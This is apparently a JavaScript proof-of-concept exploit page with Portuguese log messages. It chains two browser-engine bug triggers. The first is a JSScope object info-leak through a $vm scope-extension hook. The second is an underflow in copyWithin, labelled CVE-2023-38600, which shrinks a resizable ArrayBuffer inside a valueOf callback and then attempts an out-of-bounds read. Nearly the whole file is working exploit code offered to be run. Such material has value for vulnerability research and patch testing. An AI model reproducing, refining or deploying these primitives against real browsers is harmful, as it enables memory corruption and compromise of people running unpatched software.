function log(msg) {
  const pre = document.getElementById("log");
  pre.textContent += msg + "\n";
  console.log(msg); // também envia pro console do navegador
}

// 1) INFO-LEAK via ProxyObject / get_by_id_with_this
function leakJSScope() {
  log("=== Fase 1: Info-leak ===");

  function foo() { foo.lastThisValue = this; }
  let scope = { foo };

  log("[*] Executando foo() com escopo estendido 100 vezes...");
  for (let i = 0; i < 100; i++) {
    $vm.evaluateWithScopeExtension("foo()", scope);
  }

  log("[*] Tentando executar foo() sem escopo para forçar leak...");
  try {
    $vm.evaluateWithScopeExtension("foo()");
  } catch (e) {
    log("[!] Exceção esperada ao executar sem escopo: " + e.message);
  }

  let leak = foo.lastThisValue;
  if (leak) {
    log("[+] Leak de objeto JSScope: " + leak);
  } else {
    log("[!] Nenhum objeto vazado (leak falhou)");
  }

  return leak;
}

// 2) UNDERFLOW / copyWithin (CVE-2023-38600)
function triggerUnderflow() {
  log("\n=== Fase 2: Underflow via copyWithin ===");

  const ab = new ArrayBuffer(0x1000, { maxByteLength: 0x4000 });
  const u8 = new Uint8Array(ab);

  log("[*] Inicial ab.byteLength: " + ab.byteLength);

  function cb() {
    log("[*] Callback executado! Reduzindo buffer para 0 com ab.resize(0)...");
    try {
      ab.resize(0);
      log("[+] Resize bem-sucedido!");
    } catch (e) {
      log("[!] Erro ao tentar resize: " + e.message);
    }
    return 0;
  }

  try {
    log("[*] Executando copyWithin com from = objeto com valueOf (callback)...");
    u8.copyWithin(0x20, { valueOf: cb });
    log("[+] copyWithin retornou normalmente.");
  } catch (e) {
    log("[!] copyWithin lançou exceção: " + e.message);
  }

  log("[*] Após copyWithin - ab.byteLength: " + ab.byteLength);

  try {
    log("[*] Tentando criar Uint8Array fora do limite (offset 0x1000)...");
    const oob = new Uint8Array(ab, 0x1000, 4);
    log("[+] Leitura OOB bem-sucedida: " + oob);
  } catch (e) {
    log("[!] Leitura OOB falhou: " + e.message);
  }
}

document.getElementById("run").addEventListener("click", () => {
  log("\n=============================\n[+] Iniciando PoC combinada...\n");
  const leakedObj = leakJSScope();
  triggerUnderflow();
  log("\n[+] Teste completo.");
});
